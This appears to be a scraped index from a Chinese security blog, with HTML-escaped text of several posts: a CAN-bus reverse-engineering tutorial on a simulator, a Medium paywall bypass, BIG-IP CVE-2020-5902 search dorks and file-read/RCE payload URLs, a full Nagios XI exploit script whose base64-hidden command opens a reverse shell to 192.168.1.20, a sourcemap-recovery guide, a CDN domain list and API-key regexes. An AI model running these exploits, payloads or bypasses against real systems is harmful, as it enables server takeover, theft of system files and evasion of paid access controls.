&lt;li&gt;
&lt;p&gt;Kayak监听&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行socketcand -i vcan0，socketcand可以挂接多个CAN设备，接口名使用逗号分割即可。&lt;/li&gt;
&lt;li&gt;然后切换到Kayak的bin目录下，运行./kayak。&lt;/li&gt;
&lt;li&gt;单击File菜单-&amp;gt;new project(或者ctrl+n快捷键)，输入project名字。&lt;/li&gt;
&lt;li&gt;展开右下角connections窗口中的auto discovery，将下面的内容拖到新建的project中并输入一个名字。&lt;/li&gt;
&lt;li&gt;右键上一步中创建的bus，选择OPEN Raw View。&lt;/li&gt;
&lt;li&gt;单击工具栏中的play 按钮。开始捕获CAN总线流量。点击colorize可以对有变化的数据以不同颜色。同时还可以暂停和停止监听流量操作。&lt;br&gt;
&lt;img src=&#34;https://p0.ssl.qhimg.com/t019d504620fd505278.png&#34; alt=&#34;Kayak捕获CAN数据&#34; title=&#34;Kayak捕获CAN数据&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;candump和wireshark监听的流量都是原始流量，我们看到的数据非常多。而Kayak可以按照仲裁ID来进行分组显示，并对不同的&lt;/p&gt;
&lt;h3 id=&#34;重放can流量&#34;&gt;重放CAN流量&lt;/h3&gt;
&lt;p&gt;canplayer程序可以重放candump记录的流量内容。&lt;br&gt;
输入如下命令即可重放。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;canplayer -i candump的log文件
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重放时，可以观察下ICSim仪表盘是否有变化。&lt;/p&gt;
&lt;p&gt;对于CAN分析的工具不仅只有这几个，也可以多尝试其他网络上的工具。&lt;/p&gt;
&lt;h2 id=&#34;can消息逆向&#34;&gt;CAN消息逆向&lt;/h2&gt;
&lt;p&gt;在实战中，各个制造商和车型都有自己唯一的CAN数据包格式，而分析通信数据主要是目的是找到某个特定的信号，例如开车门锁，启动车等。通过上面监听数据，可以看到会有很多数据，这主要由于汽车本身会有很多设备会按照制定的间隔发送数据，这些数据可以称为噪音，这对分析某个具体动作带来麻烦。所以需要对CAN消息进行逆向分析。&lt;/p&gt;
&lt;h3 id=&#34;二分法&#34;&gt;二分法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;首先通过candump监听数据。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;candump -l vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;回到控制器界面，进行开门锁操作，然后在关闭车门锁。&lt;/li&gt;
&lt;li&gt;停止监听数据。数据保存到执行&lt;code&gt;mv candump-2020-06-22_140718.log source&lt;/code&gt; (文件名根据实际情况修改)&lt;/li&gt;
&lt;li&gt;关车门锁操作，执行&lt;code&gt;canplayer -I source&lt;/code&gt; 重放数据。确认车门锁是否开启。如果没有，请重复上面的步骤。&lt;/li&gt;
&lt;li&gt;输入 &lt;code&gt;wc -l source&lt;/code&gt; 命令查看文件行数。笔者这里结果为11407行。&lt;/li&gt;
&lt;li&gt;输入 &lt;code&gt;split -l 6000 source c1&lt;/code&gt; 将source文件分成两个文件。&lt;/li&gt;
&lt;li&gt;使用canplayer重放两个分割后的文件，查看重放的哪个文件打开来车门锁。每次重放前都要执行 &lt;code&gt;canplayer -I source&lt;/code&gt;。主要是保证每次重放分割的文件前车门锁是关闭的。&lt;/li&gt;
&lt;li&gt;根据第6和7的步骤对包含重放命令的文件进行。这里要注意每次split命令分割的行数减少1倍。例如第二次执行的名为 &lt;code&gt;split -l 3000 c1aa c2&lt;/code&gt; 。重放命令为 &lt;code&gt;canplayer -I c2aa&lt;/code&gt;和&lt;code&gt;canplayer -I c2ab&lt;/code&gt;。这样一直重复知道发现最终的数据包。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;经过上面的重复，在13ab的文件中定位到来了ID值和发送的数据。使用 &lt;code&gt;cansend vcan0 19B#00000E000000&lt;/code&gt; 进行验证。打开车门锁成功。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01070f3b96da292d31.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;统计法&#34;&gt;统计法&lt;/h3&gt;
&lt;p&gt;对于一些只有在进行操作时才会产生的动作，可以通过选择特定的次数，对其发送的次数进行筛选。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用 &lt;code&gt;candump -l vcan0&lt;/code&gt; 捕获数据包。&lt;/li&gt;
&lt;li&gt;在控制器界面中操作5次车门锁操作。&lt;/li&gt;
&lt;li&gt;停止candump。获得保存文件，这里为&lt;code&gt;candump-2020-06-22_151059.log&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;通过编写好的脚本，运行 &lt;code&gt;python3 can.py candump-2020-06-22_151059.log&lt;/code&gt;获得结果&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t019248468c787ec30c.png&#34; alt=&#34;统计法逆向CAN&#34; title=&#34;统计法逆向CAN&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;脚本很简单，主要就是遍历所有数据，对ID进行计数统计并显示最终结果，输入ID值可显示对应的数据内容。使用python 20行代码就可以搞定。大家可以自己编写下。&lt;/p&gt;
&lt;h3 id=&#34;观察法&#34;&gt;观察法&lt;/h3&gt;
&lt;p&gt;有了上面的一些经验积累后，借助可视化界面来对数据进行观察也可以逆向出其总线ID。&lt;br&gt;
按照上面启动Kayak的方法，启动监听数据。工具已经对ID进行来分组。将模拟器，控制器和Kayak放在同一个屏幕上。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01908719cea2669673.png&#34; alt=&#34;Kayak观察法&#34; title=&#34;Kayak观察法&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在控制器界面按下左键，模拟器界面左转向灯闪了一下，观察Kayak界面数据变化，在左转向灯闪时（也就是按下左键时），看哪一个值变了又变会原值，并保持原值。最终定位ID值为188。&lt;/p&gt;
&lt;p&gt;现在在进行另外一个例子，在汽车加速过程中，转速表是一直在上升。这就可以通过观察哪一个值是在持续上升的。这里通过控制器界面，按住上方向键，观察哪一个值是在持续增加的。最终定位ID值为244。&lt;/p&gt;
&lt;p&gt;可以通过cansend来进行验证，是否成功。&lt;/p&gt;
&lt;p&gt;当然除了使用Kayak外，也可以尝试cansniffer。&lt;/p&gt;
&lt;h2 id=&#34;icsim难度设置&#34;&gt;ICSim难度设置&lt;/h2&gt;
&lt;p&gt;以上介绍的几种方法各有利弊，不能满足所有情况，实际的情况会非常复杂，需根据实际情况进行选择。&lt;br&gt;
对于CAN总线的分析，ICSim支持从0到3的4个级别，默认难度为1级，0为最简单，3是最难。还可以设置随机化的种子值。&lt;br&gt;
输入 &lt;code&gt;./icsim -r vcan0&lt;/code&gt; 命令可以显示出随机的种子值。当然也可以使用 &lt;code&gt;./icsim -s 1419525411 vcan0&lt;/code&gt; 来设置种子值，这样仿真器就可以选择不同的ID和目标字节位置了。&lt;br&gt;
输入 &lt;code&gt;./icsim -l 3 vcan0&lt;/code&gt; 命令设置挑战难度。&lt;br&gt;
大家可以自行尝试增加难度来进行挑战。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文主要以ICSim模拟CAN总线数据，通过多种方式来对CAN总线进行逆向分析，重在方法和工具使用。部分内容并未过多提及，如果一旦拓展开来，需要写的内容实在太多。感兴趣的大家可自行进行深入学习和了解。如果在进行实车的分析和测试也要注意自身安全，提前做好计划和保障。&lt;/p&gt;
&lt;h2 id=&#34;参考或引用来源&#34;&gt;参考或引用来源&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;https://github.com/zombieCraig/ICSim&lt;/li&gt;
&lt;li&gt;https://github.com/linux-can/can-utils&lt;/li&gt;
&lt;li&gt;https://github.com/dschanoeh/Kayak/releases&lt;/li&gt;
&lt;li&gt;https://tryhackme.com/room/carhacking101&lt;/li&gt;
&lt;li&gt;https://www.securitynewspaper.com/2018/05/03/hack-car-tool/&lt;/li&gt;
&lt;li&gt;https://github.com/jaredthecoder/awesome-vehicle-security#python&lt;/li&gt;
&lt;li&gt;https://dschanoeh.github.io/Kayak/tutorial.html&lt;/li&gt;
&lt;li&gt;https://www.hackers-arise.com/post/2017/08/08/automobile-hacking-part-2-the-can-utils-or-socketcan&lt;/li&gt;
&lt;li&gt;https://www.hackers-arise.com/post/2017/08/04/automobile-hacking-part-1-the-can-protocol&lt;/li&gt;
&lt;li&gt;https://en.wikipedia.org/wiki/CAN_bus&lt;/li&gt;
&lt;li&gt;https://mp.weixin.qq.com/s/jvzLn2ZTmId4cfqBNJxYyg&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;参考书籍或文档&#34;&gt;参考书籍或文档&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;《智能网联汽车安全》&lt;/li&gt;
&lt;li&gt;《汽车黑客大曝光》&lt;/li&gt;
&lt;li&gt;《Car Hacking: Accessing and Exploiting the CAN Bus Protocol》&lt;/li&gt;
&lt;/ol&gt;
">Hacking All The Cars之CAN总线逆向</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/medium-bypass-via-google-cache/"" data-c="
          &lt;p&gt;Medium的文章有一些是需要花钱购买会员才可以看的，每个月有两次可以试看。超过则需要付费成为会员。&lt;/p&gt;
&lt;p&gt;其实通过Google cache就可以绕过限制继续查看。&lt;/p&gt;
&lt;p&gt;例如我们要查看下面的文章，发现看不了。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1595423164903.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;!-- more --&gt;
&lt;p&gt;我们通过标题搜索到medium的文章，然后点击cache。打开后，过一会会跳转显示404错误。但是，我们可以按F12打开控制台，切换到network标签，在按F5刷新下，找到带有google cache的链接。点击右侧的preview就可以查看到原文内容。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1595423337573.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;就可以看到内容了。如果看着不方便，可以复制出来。另外，该页面由js控制，通过burp类的代理工具，在查看时将js的链接地址全部过滤掉即可，直接在网页中查看，无需打开控制台。当然这里也可以通过爬虫的方式获取。&lt;/p&gt;
&lt;p&gt;其实对于绕过来说，还可以通过代理，创建多个账号等方式。这里大家跟进实际情况，自己选择吧。&lt;/p&gt;
">免费查看Medium付费内容</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/big-ip-cve-2020-5902-check-poc/"" data-c="
          &lt;p&gt;7月1日，F5发布公告，其流量管理用户接口（Traffic Management User Interface ，简称TMUI)，也称为配置实用程序（Configuration utility）。该系统存在一处RCE漏洞。CVE编号为CVE-2020-5902。&lt;/p&gt;
&lt;h2 id=&#34;搜索目标&#34;&gt;搜索目标：&lt;/h2&gt;
&lt;p&gt;注：请将下面的%26替换为&amp;amp;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;shodan&lt;/strong&gt;&lt;br&gt;
http.favicon.hash:-335242539&lt;/p&gt;
&lt;p&gt;http.title:&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;fofa&lt;/strong&gt;&lt;br&gt;
title=&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;censys&lt;/strong&gt;&lt;br&gt;
443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5&lt;/p&gt;
&lt;p&gt;443.https.get.title:&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;google&lt;/strong&gt;&lt;br&gt;
inurl:&amp;quot;tmui/login.jsp&amp;quot;&lt;/p&gt;
&lt;p&gt;intitle:&amp;quot;BIG-IP&amp;quot; inurl:&amp;quot;tmui&amp;quot;&lt;/p&gt;
&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测&lt;/h2&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp&lt;/p&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;文件读取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RCE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin （没测试成功）&lt;/p&gt;
&lt;p&gt;相关内容可以看其他地址的总结：&lt;br&gt;
&lt;a href=&#34;http://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/&#34;&gt;http://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/jas502n/CVE-2020-5902&#34;&gt;https://github.com/jas502n/CVE-2020-5902&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以上漏洞poc来自网络，请勿用于非法攻击。仅用于安全测试和自身安全检测。否则造成的一切后果自负，且与本人无关。&lt;/p&gt;
">BIG IP CVE-2020-5902 漏洞检测和利用</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/nagiosxi-rce-1/"" data-c="
          &lt;p&gt;登陆后的，比较鸡肋。4月份发现的，一直放着，后来看官网更新了，直接发出来吧。另外官方还有一个明显的sql注入没修复。不过也是登陆后，感兴趣的可以去看一下。&lt;/p&gt;
&lt;h2 id=&#34;简要信息&#34;&gt;简要信息&lt;/h2&gt;
&lt;p&gt;版本： 5.6.13（5.6.11版本也存在问题，只需要把最后文件名字中的 &lt;code&gt;-&lt;/code&gt; 去掉）&lt;br&gt;
条件：登陆后&lt;br&gt;
漏洞文件相关路径：/includes/components/xicore/export-rrd.php、includes/utils-rrdexport.inc.php&lt;br&gt;
漏洞参数：step、start、end&lt;/p&gt;
&lt;h2 id=&#34;环境&#34;&gt;环境&lt;/h2&gt;
&lt;p&gt;python3&lt;br&gt;
requests库，使用pip3安装即可。&lt;code&gt;python3 -m pip install requests&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;运行&#34;&gt;运行&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先在远程机器上监听端口，用于反弹。命令：nc -l -v -p 4444&lt;/li&gt;
&lt;li&gt;python3 nagiox.py target   (注：需带协议，如http或https)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另外，如果需要执行自己的命令，需要修改commond变量就可以了，这里也懒得改了。脚本中的命令&lt;code&gt;&amp;quot;1|(echo+\&amp;quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\&amp;quot;|base64+-d+|sh+-i);#&amp;quot;&lt;/code&gt;&lt;br&gt;
其实就是执行的&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.20/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1590571293255.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;代码保存为py文件&#34;&gt;代码（保存为py文件）&lt;/h2&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import sys, re 
import requests 

user = &#39;nagiosadmin&#39; 
pwd = &#39;nagiosadmin&#39; 
 
def main():
    print(&amp;quot;You need runing nc -l -vv -p 4444 at server.&amp;quot;)
    session = requests.session() 
    baseUrl = target + &#39;/nagiosxi/&#39;     
    checkBaseUrl = session.get(baseUrl)     
    checkBaseResp = checkBaseUrl.text 
    
    nsp_patt = &amp;quot;var nsp_str = \&amp;quot;(.*?)\&amp;quot;&amp;quot; 
    find_nsp = re.compile(nsp_patt)     
    found_nsp = re.search(find_nsp, checkBaseResp)     
    if found_nsp:         
        nsp_val = found_nsp.group(1)         
        print(&#39;nsp value found: %s&#39; % ( nsp_val ) )    
        loginurl = baseUrl + &#39;/login.php&#39;        
        data_login = {&#39;nsp&#39;: nsp_val,&#39;page&#39;: &#39;auth&#39;, &#39;debug&#39;:&#39;&#39;, &#39;pageopt&#39;:&#39;login&#39;,&#39;redirect&#39;:&#39;http://192.168.121.139/nagiosxi/index.php&#39;,&#39;username&#39;:user, &#39;password&#39;:pwd,&#39;loginButton&#39;:&#39;&#39;} 
        req = session.post(loginurl, data=data_login, verify=False, allow_redirects=True)         
        status_code = req.status_code
        resp = req.text
        
        if status_code == 200:                    
            commond = &amp;quot;1|(echo+\&amp;quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\&amp;quot;|base64+-d+|sh+-i);#&amp;quot;             
            
            req = &amp;quot;{}/includes/components/xicore/export-rrd.php?host=localhost&amp;amp;service=Root%20Partition&amp;amp;start=1584108670&amp;amp;end=1584195130&amp;amp;step={}&amp;amp;type=a&amp;amp;nsp={}&amp;quot;.format(baseUrl,commond,nsp_val)
            execsh = session.get(req, verify=False, allow_redirects=True)             
            print(execsh.text)

if __name__ == &#39;__main__&#39;:    
    target = sys.argv[1] 
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;
">Nagiosxi的一个RCE漏洞利用脚本</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/unpack-webpack-via-sourcemap/"" data-c="
          &lt;p&gt;现在许多网站都使用webpack对网站打包，许多前端框架也默认配置好webpack。这会在渗透测试或挖洞过程中带来一些麻烦。这让我们极其痛苦。但是开发者忽视起潜在风险，在线上环境使用了开发环境的配置，或者配置了sourcemap允许在生产环境中使用。这使得我们有了机会。&lt;/p&gt;
&lt;p&gt;在实际渗透过程中，许多网站还是存在这种情况。通常一般是配置了&lt;code&gt;devtool: &#39;source-map&#39;&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;我们可以在js的文件名后面加上.map，如果在这种该文件，我们则可以通过工具解压缩webpack。&lt;/p&gt;
&lt;p&gt;或者当我们一般看到类似这样的代码时，也基本可以对其进行解压缩。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1589786576692.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;p&gt;可以使用的工具有：&lt;/p&gt;
&lt;h3 id=&#34;1-sourcedetector&#34;&gt;1. SourceDetector&lt;/h3&gt;
&lt;p&gt;地址：&lt;a href=&#34;https://github.com/SunHuawei/SourceDetector&#34;&gt;https://github.com/SunHuawei/SourceDetector&lt;/a&gt;&lt;br&gt;
这个工具是chrome浏览器的插件，gogole商店中没有该插件，需要自己编译，这里遇到些坑，给大家说下编译的流程（以下环境为macos下）。&lt;/p&gt;
&lt;h4 id=&#34;安装&#34;&gt;安装&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;安装nvm。&lt;code&gt;brew install nvm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;安装nodejs。 &lt;code&gt;nvm install v11.15.0&lt;/code&gt;  (注意，由于工具是2017年发布，新版本node会有问题，所以使用老版本)&lt;/li&gt;
&lt;li&gt;安装bower和gulp。 &lt;code&gt;npm install bower&lt;/code&gt;， &lt;code&gt;npm install gulp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;git clone https://github.com/SunHuawei/SourceDetector.git&lt;/li&gt;
&lt;li&gt;npm install&lt;/li&gt;
&lt;li&gt;bower install&lt;/li&gt;
&lt;li&gt;gulp&lt;/li&gt;
&lt;li&gt;打开Chrome设置-扩展程序&lt;/li&gt;
&lt;li&gt;点击&amp;quot;加载已解压的扩展程序...&amp;quot;&lt;/li&gt;
&lt;li&gt;选择path/to/source-detector/dist目录&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;使用&#34;&gt;使用&lt;/h4&gt;
&lt;p&gt;使用很简单，开启插件，我们正常浏览网站即可，该插件会自动请求网站中是否存在.map文件。如果存在，会提示器数量。点开插件后，我们可以点击链接直接下载代码包至本地。使用简单方便。大家可以看作者的文章&lt;a href=&#34;https://zhuanlan.zhihu.com/p/26033573&#34;&gt;https://zhuanlan.zhihu.com/p/26033573&lt;/a&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1589782830447.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2restore-source-tree&#34;&gt;2.restore source tree&lt;/h3&gt;
&lt;p&gt;地址：&lt;a href=&#34;https://github.com/alexkuz/restore-source-tree&#34;&gt;https://github.com/alexkuz/restore-source-tree&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我测试了下，有的可能下载不回来文件。&lt;/p&gt;
&lt;h4 id=&#34;安装-2&#34;&gt;安装&lt;/h4&gt;
&lt;p&gt;这个是命令行工具。安装好npm后，直接 &lt;code&gt;npm i -g restore-source-tree&lt;/code&gt; 。&lt;/p&gt;
&lt;h4 id=&#34;使用-2&#34;&gt;使用&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;下载.map文件。&lt;/li&gt;
&lt;li&gt;restore-source-tree --out-dir &amp;lt;OUT_DIR&amp;gt; &lt;FILE&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;既然可以解开文件了，就可以想以前一样进行分析和挖掘了。可以尝试寻找是否有隐藏的敏感信息，发现新的输入点，挖掘xss等。&lt;/p&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;p&gt;我们需要了解下webpack和sroucemap。&lt;/p&gt;
&lt;h3 id=&#34;什么是webpack&#34;&gt;什么是webpack&lt;/h3&gt;
&lt;p&gt;webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。——来自官网说明&lt;/p&gt;
&lt;h3 id=&#34;什么是sourcemap&#34;&gt;什么是sourcemap&lt;/h3&gt;
&lt;p&gt;sourcemap是为了解决开发代码与实际运行代码不一致时，帮助我们方便在浏览器中调试代码的技术，它本身只是一个独立的map文件，与源码在同一个目录下。详细内容可以看&lt;a href=&#34;http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html&#34;&gt;JavaScript Source Map 详解&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;我们经常遇到的前端代码经过webpack打包压缩为一个文件，使得调试和分析变得头痛。那么sourcemap可以让开发者方便的调试。如果部署到线上没有关闭sourcemap，这就让我们可以如开发者一样调试js代码。&lt;/p&gt;
&lt;p&gt;本身网络上的文章讲解的很清楚了，我这里不做过多解释。请看后文参考。&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html&lt;/li&gt;
&lt;li&gt;https://www.webpackjs.com/concepts/&lt;/li&gt;
&lt;li&gt;https://zhuanlan.zhihu.com/p/26033573&lt;/li&gt;
&lt;li&gt;https://mp.weixin.qq.com/s/LRRycBY9ERIMBEh-MKjBCw&lt;/li&gt;
&lt;/ol&gt;
">通过sourcemap解压缩webpack 实战</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/some-waf-cdn-lb-list/"" data-c="
          &lt;p&gt;在信息收集过程中，会遇到使用cdn、云waf等的子域名。这样在做端口扫描时就会出现大量开放的端口。这就会导致扫描时间变长，多出来许多无用的信息。这里收集了一些，大家可以用到自己的扫描器中或开源程序中，遇到域名cname使用这些域名的时候可以跳过端口检查，节省时间。&lt;/p&gt;
&lt;p&gt;以下列表主要收集了一些大型互联网企业（腾讯、百度、滴滴、字节跳动、360、阿里巴巴、美团、京东等），然后经过人工整理出来，有遗漏在所难免，欢迎大家补充。&lt;/p&gt;
&lt;p&gt;w.alikunlun.com&lt;br&gt;
wsglb0.com&lt;br&gt;
w.kunlunpi.com&lt;br&gt;
elb.amazonaws.com&lt;br&gt;
wswebpic.com&lt;br&gt;
mig.tencent-cloud.net&lt;br&gt;
cloud.tc.qq.com&lt;br&gt;
qcloudcjgj.com&lt;br&gt;
pop3.mxhichina.com&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;smtp.mxhichina.com&lt;br&gt;
mail.mxhichina.com&lt;br&gt;
alibabadns.com&lt;br&gt;
w.kunlunle.com&lt;br&gt;
alicdn.com&lt;br&gt;
wagbridge.alibaba.com&lt;br&gt;
cdn20.com&lt;br&gt;
wscdns.com&lt;br&gt;
yjs-cdn.com&lt;br&gt;
yunjiasu-cdn.net&lt;br&gt;
jomodns.com&lt;br&gt;
bdydns.com&lt;br&gt;
cdn.cloudflare.net&lt;br&gt;
iotacdn.net&lt;br&gt;
kxcdn.com&lt;br&gt;
ks-cdn.com&lt;br&gt;
chinacache.net&lt;br&gt;
w.kunlunar.com&lt;br&gt;
ksyuncdn.com&lt;br&gt;
cdn.dnsv1.com&lt;br&gt;
waf.didiyun.com&lt;br&gt;
cdntip.com&lt;br&gt;
s3-cname.didiyunapi.com&lt;br&gt;
qhcdn.com&lt;br&gt;
qss-lb.com&lt;br&gt;
cloudcdn.net&lt;br&gt;
ccgslb.net&lt;br&gt;
qh-lb.com&lt;br&gt;
360qhcdn.com&lt;br&gt;
qh-cdn.com&lt;br&gt;
yundun_external.vcloudgtm.com&lt;br&gt;
360vcloud.com&lt;br&gt;
360wzb.com&lt;br&gt;
cloudglb.com&lt;br&gt;
qihucdn.cn&lt;br&gt;
qihucdn.com&lt;br&gt;
alibabadns.com&lt;br&gt;
bytedns.net&lt;br&gt;
cdn.bytedance.com&lt;br&gt;
w.kunlunca.com&lt;br&gt;
cdngslb.com&lt;br&gt;
w.kunluncan.com&lt;br&gt;
akadns.net&lt;br&gt;
w.cdngslb.com&lt;br&gt;
w.kunlungr.com&lt;br&gt;
bsgslb.com&lt;br&gt;
netdna-cdn.com&lt;br&gt;
cdn.aliyun.com&lt;br&gt;
cdn.aliyuncs.com&lt;br&gt;
error.aliyundun.com&lt;br&gt;
error.aliyundun.net&lt;br&gt;
errors.aliyundun.com&lt;br&gt;
errors.aliyundun.net&lt;br&gt;
error.aliyun.net&lt;br&gt;
error.aliyun.com&lt;br&gt;
errors.aliyun.net&lt;br&gt;
errors.aliyun.com&lt;br&gt;
cloudfloordns.com&lt;br&gt;
hwclouds.com&lt;br&gt;
cdn.sucuri.net&lt;br&gt;
waf.tencentcloud.com&lt;br&gt;
waf.tencent-cloud.com&lt;br&gt;
wangshan.360.cn&lt;br&gt;
gslb.qianxun.com&lt;br&gt;
jdcloudcs.com&lt;br&gt;
jcloudlb.com&lt;br&gt;
jdcloudwaf.com&lt;/p&gt;
&lt;p&gt;企业邮箱&lt;br&gt;
qiye.163.com&lt;br&gt;
outlook.com&lt;br&gt;
office.com&lt;br&gt;
exmail.qq.com&lt;/p&gt;
">一些流行的云waf、cdn、lb的域名列表（80条）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Extract-API-Keys-From-Regex/"" data-c="
          &lt;p&gt;分享几十条提取api key的正则表达式。可以借助burp、Mitmproxy，goproxy等来实现敏感信息的发现。&lt;br&gt;
在实际使用过程中，因为有部分规则是有转义的，在整合进工具的时候需要检查下，修正后使用即可。也欢迎大家回复本文补充新的～&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;aliyun_oss_url&amp;quot;: &amp;quot;[\\w-.]\\.oss.aliyuncs.com&amp;quot; 
&amp;quot;azure_storage&amp;quot;: &amp;quot;https?://[\\w-\.]\\.file.core.windows.net&amp;quot;
&amp;quot;access_key&amp;quot;: &amp;quot;[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)&amp;quot;
&amp;quot;secret_key&amp;quot;: &amp;quot;[Ss](ecret|ECRET)_?[Kk](ey|EY)&amp;quot;
